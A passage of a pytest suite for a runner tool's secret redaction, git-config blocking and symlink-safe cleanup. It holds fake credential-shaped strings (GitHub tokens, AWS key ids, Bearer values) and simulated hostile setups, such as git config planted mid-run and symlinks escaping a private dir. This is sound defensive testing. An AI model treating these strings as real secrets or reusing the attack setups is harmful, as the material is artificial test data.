    cfg = proj.tmp / ("cfg-" + g + ".cfg")                               # deny_set_keys[].origin + key
    cfg.write_text('[filter "%s"]\n\tclean = cat\n' % g)
    (proj.tmp / "home" / ".gitconfig").write_text("[include]\n\tpath = %s\n" % cfg)
    wrap = proj.tmp / ("bin-" + g)                                       # path_sanitised + git.path
    wrap.mkdir()
    (wrap / "git").write_text(SHEBANG + "\nimport os, sys\nos.execv(%r, [%r] + sys.argv[1:])\n"
                              % (gitiso.GIT_ABS, gitiso.GIT_ABS))
    (wrap / "git").chmod(0o755)
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, path="%s:%s:/usr/bin:/bin" % (wrap, proj.sysbin))
    assert res.code == 0, (res.code, res.err)
    rep = res.report
    assert rep["path_sanitised"][0] == str(proj.tmp / "bin-<REDACTED>"), rep["path_sanitised"]
    assert rep["git"]["path"] == str(proj.tmp / "bin-<REDACTED>" / "git"), rep["git"]["path"]
    assert {"path": "<REDACTED>/a.log", "rule": "tracked-gitignore", "source": "<REDACTED>/.gitignore"} \
        in rep["tree_check"], rep["tree_check"]
    key = next(k for k in rep["git"]["config_scan"]["deny_set_keys"] if k["scope"] == "global")
    assert key["key"] == "filter.<REDACTED>.clean" and key["origin"].endswith("cfg-<REDACTED>.cfg"), key
    data = _all_output_bytes(proj)
    _no_token_bytes(data, [g])
    assert _sac27_metric(dr, data) == 0


# S29-1: a user-trusted deny-set key git lowercased from an old-syntax `[filter.AKIA...]` header is
# redacted in the report's deny_set_keys[].key too

# S31-1: the any-case pass runs after the base rules, so an id inside a key=value / Bearer value
# never stops those rules from withholding the rest of the value (the secret tail)
S31_TAIL = "S3cretTailValue99"
S31_SECRET40 = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEYzz"                 # fake, 40 chars
S31_HEADERS = [
    ('[filter "token=%s%s"]' % (AKIA, S31_TAIL), [AKIA, AKIA.lower(), S31_TAIL], "filter.token=<REDACTED>"),
    ('[filter "access_key=%s:%s"]' % (AKIA, S31_SECRET40), [AKIA, AKIA.lower(), S31_SECRET40],
     "filter.access_key=<REDACTED>"),
    ('[filter "Bearer %s%s"]' % (AKIA, S31_TAIL), [AKIA, AKIA.lower(), S31_TAIL], "filter.Bearer <REDACTED>"),
    # Chris C31-2: a lower-case id, which only the any-case pass knows, ahead of a Bearer tail
    ('[filter "Bearer %s%s"]' % (AKIA.lower(), "Q" * 18), [AKIA.lower(), "Q" * 18], "filter.Bearer <REDACTED>"),
]


@pytest.mark.parametrize("header,parts,shown", [
    ("[filter.%s]" % AKIA, [AKIA, AKIA.lower()], "filter.<REDACTED>.clean"),
    ('[filter "a.%s"]' % AKIA, [AKIA, AKIA.lower()], "filter.a.<REDACTED>.clean"),
] + S31_HEADERS)
def test_report_user_config_key_aws_id_any_case_is_redacted(proj, dr, header, parts, shown):
    (proj.tmp / "home" / ".gitconfig").write_text("%s\n\tclean = cat\n" % header)
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s)
    assert res.code == 0, (res.code, res.err)
    keys = [k for k in res.report["git"]["config_scan"]["deny_set_keys"] if k["scope"] == "global"]
    assert [k["key"] for k in keys] == [shown], keys
    _no_token_bytes(_all_output_bytes(proj), parts)
    _no_token_bytes((res.out + res.err).encode(), parts)                 # Chris I-2: stderr too


class _FakeSys:
    executable = "/opt/py-" + SECRETS["ghp"] + "/python3"


def test_report_fields_redaction_unit(dr):
    """Every host- or project-chosen report field, including the ones no fixture reaches cheaply
    (interpreter path, git version line, gitlinks, index flags, run cwd and executable)."""
    g = SECRETS["ghp"]
    split = g[:24] + "\u200b" + g[24:]
    ctx = dr.Ctx()
    ctx.catalogue_sha, ctx.path_entries = "0" * 64, ["/opt/" + g + "/bin"]
    ctx.git, ctx.git_version = dr.Git("/opt/" + g + "/git", {}, "/w"), "git version 2.50.0 " + g
    ctx.config_scan = {"records": 1, "blocked": [], "deny_set_keys": [
        {"key": "filter.%s.clean" % g, "scope": "global", "origin": "file:/h/" + g, "verdict": "user-trusted"}]}
    ctx.gitlinks = [{"path": g + "/sub", "state": "absent"}]
    ctx.flag_results = [{"path": g + ".md", "tag": "h", "result": "verified"}]
    ctx.tree_records = [{"path": split + "/a.log", "rule": "tracked-gitignore", "source": split + "/.gitignore"},
                        {"path": "plain.md", "rule": "data-path"}]
    run = {"id": "r1", "cwd": "/w/" + g, "executable": "/w/" + g + "/node_modules/axe", "status": "exit"}
    real_sys, dr.sys = dr.sys, _FakeSys
    try:
        rep = dr._report(ctx, [run], 0)
    finally:
        dr.sys = real_sys
    data = json.dumps(rep, ensure_ascii=True).encode()
    _no_token_bytes(data, [g, g[:24], g[24:]])
    assert _sac27_metric(dr, data) == 0
    assert rep["tree_check"][0]["path"] == "<REDACTED>" and rep["tree_check"][0]["source"] == "<REDACTED>"
    assert rep["tree_check"][1] == {"path": "plain.md", "rule": "data-path"}
    assert rep["git"]["path"] == "/opt/<REDACTED>/git" and rep["runs"][0]["status"] == "exit"
    assert run["cwd"] == "/w/" + g                       # the in-memory result is not changed


# S16-I3: a directory a child locked inside the private dir no longer keeps its raw streams behind

@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores directory permissions")
def test_private_dir_is_removed_when_a_child_locked_a_directory_in_it(proj, dr):
    real = dr._stage_out

    def lock_then_stage(item, ctx, result):
        locked = Path(item["stage"]) / "locked"
        locked.mkdir()
        (locked / "f").write_text("child output\n")
        os.chmod(locked, 0)
        return real(item, ctx, result)

    proj.set_ctl("axe", save_text="{}")
    o, s = proj.order([RUN_AXE])
    tmp = proj.tmp / "runner-tmp"
    try:
        res = proj.run(dr, o, s, patches=[(dr, "_stage_out", lock_then_stage)])
        left = sorted(p.name for p in tmp.iterdir())
    finally:
        for d, _dirs, _files in os.walk(tmp):
            for sub in _dirs:
                os.chmod(os.path.join(d, sub), 0o700)
    assert res.code == 0 and res.run("r1")["dropped"] == [{"name": "locked", "reason": "undeclared"}], res.err
    assert left == [], left


# ------------------------------------------------------------------------------------------------
# v7u.4.24 iter 2: Sentinel S24-1, S24-2, S24-6, S24-7; Chris C24-1, C24-2, C24-3, C24-5
# ------------------------------------------------------------------------------------------------

GHP_SPLIT = SECRETS["ghp"][:24] + "​" + SECRETS["ghp"][24:]
GHP_HALVES = [SECRETS["ghp"][:24], SECRETS["ghp"][24:]]
KV_NBSP = "/opt/password= abcdef/bin"        # matches only once json.dumps writes ` `


# S24-1: runs[].argv carries the stage path (TMPDIR), the root and the interpreter path, all
# host-chosen, so it goes through _redact_value like runs[].executable

def test_record_argv_withholds_a_split_token_unit(dr):
    result = {"redactions": {"argv": 0}}
    item = {"tpl": {"runner": "project-bin"}}
    dr._record_argv(result, item, ["/w/" + GHP_SPLIT + "/node_modules/.bin/axe", "--save",
                                   "/t/" + SECRETS["ghp"] + "/out/r1.axe.json", KV_NBSP, "http://localhost:3000/x"])
    assert result["argv"] == ["<REDACTED>", "--save", "/t/<REDACTED>/out/r1.axe.json", "<REDACTED>",
                              "http://localhost:3000/x"], result["argv"]
    assert result["redactions"]["argv"] >= 3, result["redactions"]
    data = json.dumps(result["argv"], ensure_ascii=True).encode()   # executable: _report redacts it
    _no_token_bytes(data, GHP_HALVES + [SECRETS["ghp"]])
    assert _sac27_metric(dr, data) == 0


def test_argv_stage_path_with_a_split_token_in_tmpdir_is_withheld(proj, dr):
    tmpdir = proj.tmp / ("tmp-" + GHP_SPLIT)
    tmpdir.mkdir()
    proj.set_ctl("axe", save_text="{}")
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, extra_env={"TMPDIR": str(tmpdir)})
    assert res.code == 0, (res.code, res.err)
    assert res.run("r1")["argv"][2:] == ["--dir", "<REDACTED>", "--save", "r1.axe.json"], res.run("r1")["argv"]
    data = _all_output_bytes(proj)
    _no_token_bytes(data, GHP_HALVES)
    assert _sac27_metric(dr, data) == 0
    assert sorted(tmpdir.iterdir()) == []


# S24-2 / C24-2: a value whose JSON-escaped form matches (a non-ASCII space after `key=`) is
# withheld whole, so the report bytes never match the redaction set

@pytest.mark.parametrize("space", [" ", " ", "　", " ", " "])
def test_value_matching_only_in_its_json_escaped_form_is_withheld_unit(dr, space):
    name = "/opt/password=" + space + "abcdef/bin"
    assert dr._redact(name)[1] == 0                                   # the raw form does not match
    for value in (dr._redact_value(name), dr._show(name)):
        assert value == "<REDACTED>", value
        assert dr._redact(json.dumps(value, ensure_ascii=True))[1] == 0
    for ordinary in ("/opt/café/bin", "/opt/a b/bin", "/opt/password=<REDACTED>/x", 'q"\\x'):
        assert dr._redact_value(ordinary) == ordinary, ordinary
        assert dr._show(ordinary) == dr._escape(ordinary), ordinary


def test_report_value_matching_only_in_its_json_escaped_form_is_withheld_unit(dr):
    ctx = dr.Ctx()
    ctx.catalogue_sha, ctx.path_entries = "0" * 64, [KV_NBSP, "/usr/bin"]
    rep = dr._report(ctx, [{"id": "r1", "cwd": KV_NBSP, "executable": "/usr/bin/x"}], 0)
    data = json.dumps(rep, ensure_ascii=True).encode()
    assert rep["path_sanitised"] == ["<REDACTED>", "/usr/bin"] and rep["runs"][0]["cwd"] == "<REDACTED>", rep
    assert _sac27_metric(dr, data) == 0


# S24-7: a token-shaped task id is refused (it is written raw into the report's paths, R64);
# real tracker ids pass

def _order_for(task):
    req = "outputs/%s/01-ux-design-run-request-3a-iter1.json" % task
    return {"schema": 1, "task": task, "phase": "3a", "iter": 1, "request_path": req,
            "request_sha256": "0" * 64, "change_paths": [], "loopback_ports": None}


@pytest.mark.parametrize("task", ["shode-house-v7u.4.24", "t-1", "bd-42", "PROJ-1234", "risk-assessment-v2"])
def test_real_task_ids_pass_the_order_check_unit(dr, task):
    assert dr._validate_order(_order_for(task), {"task": task, "phase": "3a", "iter": "1"}) is None


# C24b-3: a token-shaped id has its own detail (the id is not echoed); a slug that mentions
# scikit-learn as `sk-learn` with 16+ characters after `sk-` is a known refusal
@pytest.mark.parametrize("task", [SECRETS["ghp"], AKIA, SK, "sk-" + "a1" * 30, "sk-learn-pipeline-upgrade"])
def test_token_shaped_task_id_is_refused_unit(dr, task):
    assert dr.TASK_RE.fullmatch(task)                                 # the shape rule alone accepts it
    with pytest.raises(dr.Blocked) as exc:
        dr._validate_order(_order_for(task), {"task": task, "phase": "3a", "iter": "1"})
    assert (exc.value.token, exc.value.detail) == ("design-run-schema", "order task token-shaped")


@pytest.mark.parametrize("task", ["-t", "a..b", "a/b", "x" * 65, 7])
def test_malformed_task_id_keeps_the_plain_detail_unit(dr, task):
    with pytest.raises(dr.Blocked) as exc:
        dr._validate_order(_order_for(task), {"task": task, "phase": "3a", "iter": "1"})
    assert (exc.value.token, exc.value.detail) == ("design-run-schema", "order task")


def test_token_shaped_task_id_blocks_before_any_output(proj, dr):
    task = SECRETS["ghp"]
    out = proj.root / "outputs" / task
    out.mkdir(parents=True)
    req_rel = "outputs/%s/01-ux-design-run-request-3a-iter1.json" % task
    rb = json.dumps({"schema": 1, "task": task, "phase": "3a", "iter": 1, "runs": [RUN_AXE]}).encode()
    (proj.root / req_rel).write_bytes(rb)
    order = dict(_order_for(task), request_sha256=hashlib.sha256(rb).hexdigest())
    ob = json.dumps(order).encode()
    order_rel = "outputs/%s/02-design-run-order-3a-iter1.json" % task
    (proj.root / order_rel).write_bytes(ob)
    err = blocked(proj.run(dr, order_rel, hashlib.sha256(ob).hexdigest()), "design-run-schema order task")
    assert err == "BLOCKED: design-run-schema order task token-shaped\n", err
    _no_token_bytes(err.encode(), [task])
    assert sorted(p.name for p in out.iterdir()) == ["01-ux-design-run-request-3a-iter1.json",
                                                     "02-design-run-order-3a-iter1.json"]


# C24-3: a deny-set key is project- or user-chosen (a git config subsection holds any character but
# newline and NUL), so the BLOCKED / tree-changed detail shows it through _show like its origin

# S24b-1: an AWS key id (upper case only) in a subsection is redacted before any lowercasing; only
# the section and the variable name are lowercased. S29-1: git lowercases an old-syntax
# `[filter.Sub]` subsection itself, so the id arrives in lower case and is redacted in any case
ASIA = "ASIA" + "Q4W8E2R6T0Y3U7I5"
CONFIG_KEY_CASES = [
    ('[filter "%s"]' % GHP_SPLIT, GHP_HALVES + ["​"], "<REDACTED>"),
    ('[filter "a\x1b[31mb"]', ["\x1b"], None),
    ('[filter "%s"]' % AKIA, [AKIA, AKIA.lower()], "filter.<REDACTED>.clean"),
    ('[filter "%s"]' % ASIA, [ASIA, ASIA.lower()], "filter.<REDACTED>.clean"),
    ("[filter.%s]" % AKIA, [AKIA, AKIA.lower()], "filter.<REDACTED>.clean"),          # old syntax
    ("[filter.%s]" % ASIA, [ASIA, ASIA.lower()], "filter.<REDACTED>.clean"),          # old syntax
    ("[filter.a.%s]" % AKIA, [AKIA, AKIA.lower()], "filter.a.<REDACTED>.clean"),      # old, dotted
] + S31_HEADERS


@pytest.mark.parametrize("header,parts,shown", CONFIG_KEY_CASES)
def test_project_config_key_is_shown_escaped_and_redacted(proj, dr, header, parts, shown):
    with open(proj.root / ".git/config", "a") as fh:
        fh.write('%s\n\tclean = cat\n' % header)
    o, s = proj.order([RUN_PAIR])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input git-config ")
    assert err.count("\n") == 1 and err.endswith("\n"), err
    assert "(file:.git/config)" in err, err
    if shown is not None:
        assert err.startswith("BLOCKED: design-run-untrusted-input git-config %s (file:" % shown), err
    _no_token_bytes(err.encode(), parts)


@pytest.mark.parametrize("header,parts,shown", [c for c in CONFIG_KEY_CASES if c[2] is not None])
def test_user_config_key_new_since_step_1_is_shown_redacted(proj, dr, header, parts, shown):
    real = dr._spawn_child

    def spawn_then_plant(*a, **k):
        out = real(*a, **k)
        with open(proj.tmp / "home" / ".gitconfig", "a") as fh:
            fh.write('%s\n\tclean = cat\n' % header)
        return out

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_spawn_child", spawn_then_plant)])
    r1 = res.run("r1")
    assert res.code == 1 and r1["status"] == "tree-changed", (res.code, res.err, r1)
    assert r1["reason"].startswith("design-run-untrusted-input git-config %s (file:" % shown), r1
    assert r1["reason"].endswith("(new since step 1)"), r1
    data = _all_output_bytes(proj)
    _no_token_bytes(data, parts)
    assert _sac27_metric(dr, data) == 0


@pytest.mark.parametrize("key,shown", [
    ("filter.%s.clean" % AKIA, "filter.<REDACTED>.clean"),
    ("Filter.%s.Clean" % ASIA, "filter.<REDACTED>.clean"),
    ("Filter.CamelSub.Clean", "filter.CamelSub.clean"),       # a subsection keeps its case, as in git
    ("filter.a.b.Clean", "filter.a.b.clean"),                 # the subsection may hold dots
    ("filter.a.%s.Clean" % AKIA, "filter.a.<REDACTED>.clean"),  # Chris C29-1: rpartition, not partition
    ("filter.Ab.Cd.Clean", "filter.Ab.Cd.clean"),
    ("filter.%s.clean" % AKIA.lower(), "filter.<REDACTED>.clean"),      # S29-1: git lowercased it
    ("filter.a.%s.clean" % ASIA.lower(), "filter.a.<REDACTED>.clean"),
    ("filter.%s.clean" % (AKIA.lower()[:10] + AKIA[10:]), "filter.<REDACTED>.clean"),  # mixed case
    ("filter.akia%s.clean" % ("z" * 15), "filter.akia%s.clean" % ("z" * 15)),  # one short of an id
    # S31-1: an id-shaped run inside a token never leaves the token's fragments behind
    ("filter.ghp_a1B2c3D4%sx9Y8z7W6.clean" % ASIA.lower(), "filter.<REDACTED>.clean"),
    ("filter.ghp_a1B2c3D4%sx9Y8z7W6.clean" % AKIA, "filter.<REDACTED>.clean"),
    ("filter.sk-Zz%sTail0123.clean" % ASIA.lower(), "filter.<REDACTED>.clean"),
    ("filter.token=%s%s.clean" % (AKIA.lower(), S31_TAIL), "filter.token=<REDACTED>"),
    ("filter.Bearer %s%s.clean" % (AKIA.lower(), "Q" * 18), "filter.Bearer <REDACTED>"),  # Chris C31-2
    ("filter.x%s.clean" % AKIA.lower(), "filter.x<REDACTED>.clean"),  # C31-3: no left boundary, on purpose
    ("Core.FsMonitor", "core.fsmonitor"),
    ("NoDot", "nodot"),
])
def test_config_key_lowercases_only_section_and_variable_unit(dr, key, shown):
    assert dr._show_config_key(key) == shown


# C24-1: a symlink a child leaves in the private dir is never followed by the cleanup

@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores directory permissions")
def test_private_dir_cleanup_never_follows_a_symlink_out_of_it(proj, dr):
    outside = proj.tmp / "outside"
    (outside / "inner").mkdir(parents=True)
    (outside / "inner" / "keep").write_text("outside\n")
    os.chmod(outside / "inner", 0o500)
    os.chmod(outside, 0o500)
    real = dr._stage_out

    def link_then_stage(item, ctx, result):
        os.symlink(str(outside), str(Path(item["stage"]) / "link"))
        return real(item, ctx, result)

    proj.set_ctl("axe", save_text="{}")
    o, s = proj.order([RUN_AXE])
    try:
        res = proj.run(dr, o, s, patches=[(dr, "_stage_out", link_then_stage)])
        modes = (stat.S_IMODE(outside.stat().st_mode), stat.S_IMODE((outside / "inner").stat().st_mode))
        kept = (outside / "inner" / "keep").read_text()
    finally:
        os.chmod(outside, 0o700)
        os.chmod(outside / "inner", 0o700)
    assert res.code == 0, (res.code, res.err)
    assert modes == (0o500, 0o500), [oct(m) for m in modes]
    assert kept == "outside\n"
    assert sorted((proj.tmp / "runner-tmp").iterdir()) == []


# S24-6: a tree nested deeper than shutil.rmtree's recursion limit is still removed, and the
# cleanup never raises out of main's finally

def _deep_tree(top, depth, lock_last=False):
    fd = os.open(str(top), os.O_RDONLY)
    try:
        for _ in range(depth):
            os.mkdir("d", dir_fd=fd)
            nfd = os.open("d", os.O_RDONLY, dir_fd=fd)
            os.close(fd)
            fd = nfd
        wfd = os.open("raw.stdout", os.O_WRONLY | os.O_CREAT, 0o600, dir_fd=fd)
        os.write(wfd, b"unredacted child output\n")
        os.close(wfd)
        os.mkdir("locked", dir_fd=fd)
        lfd = os.open("locked", os.O_RDONLY, dir_fd=fd)
        os.close(os.open("raw.stderr", os.O_WRONLY | os.O_CREAT, 0o600, dir_fd=lfd))
        os.close(lfd)
        if lock_last:
            os.chmod("locked", 0, dir_fd=fd)
    finally:
        os.close(fd)


@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores directory permissions")
def test_deeply_nested_private_dir_is_removed_unit(dr, tmp_path, capsys):
    private = tmp_path / "design-run-deep"
    private.mkdir()
    _deep_tree(private, 1100, lock_last=True)
    outside = tmp_path / "outside"
    outside.mkdir(mode=0o500)
    os.symlink(str(outside), str(private / "link"))
    try:
        dr._remove_private(str(private))
        left, mode = os.path.lexists(private), stat.S_IMODE(outside.stat().st_mode)
    finally:
        os.chmod(outside, 0o700)
        if os.path.lexists(private):                  # leave nothing pytest cannot remove
            dr._flatten(str(private))
            shutil.rmtree(private, ignore_errors=True)
    assert not left
    assert mode == 0o500, oct(mode)
    assert capsys.readouterr().err == ""


def test_flatten_never_follows_a_symlink_unit(dr, tmp_path):
    private = tmp_path / "p"
    (private / "a" / "b").mkdir(parents=True)
    outside = tmp_path / "outside"
    (outside / "sub").mkdir(parents=True)
    (outside / "sub" / "keep").write_text("k\n")
    os.symlink(str(outside), str(private / "a" / "b" / "link"))
    os.symlink(str(outside / "sub" / "keep"), str(private / "a" / "file-link"))
    os.symlink(str(outside), str(private / "top-link"))
    dr._flatten(str(private))
    assert (outside / "sub" / "keep").read_text() == "k\n"
    assert [p.name for p in private.iterdir()] == []


# C24b-4: the RecursionError fallback is pinned on any interpreter (3.12+ rmtree is iterative, so
# the deep test alone no longer reaches it there)

def test_rmtree_recursion_error_falls_back_to_flatten_unit(dr, tmp_path, capsys, monkeypatch):
    private = tmp_path / "design-run-small"
    (private / "a" / "b").mkdir(parents=True)
    (private / "a" / "b" / "raw.stdout").write_text("unredacted\n")
    (private / "top.txt").write_text("t\n")
    real, calls = shutil.rmtree, []
    real_flatten, flattened, steps = dr._flatten, [], []

    def rmtree_recursion_first(path, *a, **k):
        calls.append(str(path))
        steps.append("rmtree")
        if len(calls) == 1:
            raise RecursionError("maximum recursion depth exceeded")
        return real(path, *a, **k)

    def flatten_spy(path):                         # Chris C29-2: pin the flatten step itself
        flattened.append(str(path))
        steps.append("flatten")
        return real_flatten(path)

    monkeypatch.setattr(dr.shutil, "rmtree", rmtree_recursion_first)
    monkeypatch.setattr(dr, "_flatten", flatten_spy)
    dr._remove_private(str(private))
    assert not os.path.lexists(private)
    assert calls == [str(private), str(private)], calls
    assert flattened == [str(private)], flattened
    assert steps == ["rmtree", "flatten", "rmtree"], steps
    assert capsys.readouterr().err == ""


# C24-5: a private dir that cannot be removed is reported on stderr (one line, path shown);
# C24b-1: with a writable target too, so a no-follow regression in _flatten's top-level open
# would delete the target's contents instead of failing on EACCES

@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores directory permissions")
@pytest.mark.parametrize("target_mode", [0o500, 0o700])
def test_private_dir_not_removed_is_reported_unit(dr, tmp_path, capsys, target_mode):
    target = tmp_path / "target"
    (target / "sub").mkdir(parents=True)
    (target / "keep").write_text("k\n")
    (target / "sub" / "keep2").write_text("k2\n")
    os.chmod(target, target_mode)
    link = tmp_path / ("design-run-" + GHP_SPLIT)
    os.symlink(str(target), str(link))                # rmtree refuses a symlink; nothing is followed
    try:
        dr._remove_private(str(link))
        mode = stat.S_IMODE(target.stat().st_mode)
    finally:
        os.chmod(target, 0o700)
    err = capsys.readouterr().err
    assert err == "design-run: private dir not removed: <REDACTED>\n", err
    assert mode == target_mode, oct(mode)             # Chris N17: the top is lstat-ed, never followed
    assert (target / "keep").read_text() == "k\n"
    assert (target / "sub" / "keep2").read_text() == "k2\n"
